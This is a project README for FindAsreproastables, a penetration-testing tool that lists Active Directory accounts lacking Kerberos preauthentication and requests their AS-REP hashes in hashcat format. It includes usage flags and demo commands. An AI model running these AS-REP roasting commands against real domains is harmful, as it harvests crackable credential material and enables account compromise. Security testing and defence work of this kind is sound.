![](./.github/banner.png)

<p align="center">
      Find accounts without Kerberos preauthentication in Active Directory and request hashcat-ready AS-REP hashes.
      <br>
      <a href="https://github.com/TheManticoreProject/FindAsreproastables/actions/workflows/release.yaml" title="Build"><img alt="Build and Release" src="https://github.com/TheManticoreProject/FindAsreproastables/actions/workflows/release.yaml/badge.svg"></a>
      <img alt="GitHub release (latest by date)" src="https://img.shields.io/github/v/release/TheManticoreProject/FindAsreproastables">
      <img alt="Go Report Card" src="https://goreportcard.com/badge/github.com/TheManticoreProject/FindAsreproastables">
      <a href="https://twitter.com/intent/follow?screen_name=podalirius_" title="Follow"><img src="https://img.shields.io/twitter/follow/podalirius_?label=Podalirius&style=social"></a>
      <a href="https://www.youtube.com/c/Podalirius_?sub_confirmation=1" title="Subscribe"><img alt="YouTube Channel Subscribers" src="https://img.shields.io/youtube/channel/subscribers/UCF_x5O7CSfr82AfNVTKOv_A?style=social"></a>
      <br>
</p>

## Features

- [x] Find asreproastable users through LDAP
- [x] Request RC4 AS-REP hashes in hashcat mode 18200 format
- [x] Support for LDAP and LDAPS connections with automatic signing/encryption detection
- [x] Kerberos and NTLM authentication support
- [x] NT/LM hash authentication support
- [x] Tree-formatted `find` output and one hash per line in `request` mode

## Usage

```
$ ./FindAsreproastables -h
Usage: FindAsreproastables --domain <string> --username <string> [--password <string>] [--hashes <string>] [--debug] [--mode <string>] --dc-ip <string> [--ldap-port <tcp port>] [--use-ldaps] [--use-kerberos]

  Configuration:
    --debug             Debug mode. (default: false)
    -m, --mode <string> Mode: find lists accounts; request prints hashcat AS-REP hashes. (default: "find")

  LDAP Connection Settings:
    -dc, --dc-ip <string>       IP address or hostname of the domain controller/KDC.
    -lp, --ldap-port <tcp port> Port number to connect to LDAP server. (default: 389)
    -L, --use-ldaps             Use LDAPS instead of LDAP. (default: false)
    -k, --use-kerberos          Use Kerberos instead of NTLM. (default: false)

  Authentication:
    -d, --domain <string>   Active Directory domain to authenticate to.
    -u, --username <string> User to authenticate as.
    -p, --password <string> Password to authenticate with. (default: "")
    -H, --hashes <string>   NT/LM hashes, format is LMhash:NThash. (default: "")
```

`find` is the default mode and preserves the original DN listing. `request` first finds
accounts through LDAP, then offers RC4 as the session-key etype in an AS-REQ for each
account. Standard output contains only hashcat mode 18200 hashes, one per line. Failures
go to standard error; the command exits nonzero if any account fails. The KDC can still
encrypt an AS-REP with an AES account key, which hashcat mode 18200 does not accept.
Only accounts whose replies have RC4 encrypted parts produce hash lines. The `-H/--hashes`
option supplies NT/LM hashes for LDAP authentication; it does not select hash output.

## Demonstration

```
$ ./FindAsreproastables --mode find -d DOMAIN.local -u Administrator -p 'P@ssw0rd!' -dc 192.168.1.10 -L -lp 636
FindAsreproastables - by Remi GASCOU (Podalirius) @ TheManticoreProject - v1.0.0

Found 2 asreproastable users:
├── CN=ServiceAccount,CN=Users,DC=DOMAIN,DC=local
└── CN=TestUser,CN=Users,DC=DOMAIN,DC=local
Done
```

Request hashes for the discovered accounts:

```
$ ./FindAsreproastables --mode request -d DOMAIN.local -u Administrator -p 'P@ssw0rd!' -dc 192.168.1.10 -L -lp 636 > asrep.hashes
$ head -n 1 asrep.hashes
$krb5asrep$23$ServiceAccount@DOMAIN.LOCAL:<checksum>$<encrypted-data>
```

## Contributing

Pull requests are welcome. Feel free to open an issue if you want to add other features.

## Credits

- [Remi GASCOU (Podalirius)](https://github.com/Podalirius) for the creation of the FindAsreproastables tool before transferring it to TheManticoreProject.
